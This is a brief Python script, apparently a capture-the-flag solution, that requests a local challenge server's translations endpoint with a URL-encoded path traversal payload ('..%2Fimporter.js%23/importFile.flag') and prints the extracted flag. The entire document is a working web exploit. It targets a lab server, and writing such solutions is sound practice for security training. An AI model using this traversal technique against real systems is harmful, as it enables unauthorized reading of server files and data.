import requests

CHALL_URL = 'http://localhost:3000'

res = requests.get(CHALL_URL + '/translations/..%2Fimporter.js%23/importFile.flag')
flag = res.text[1:-3]
print(flag)
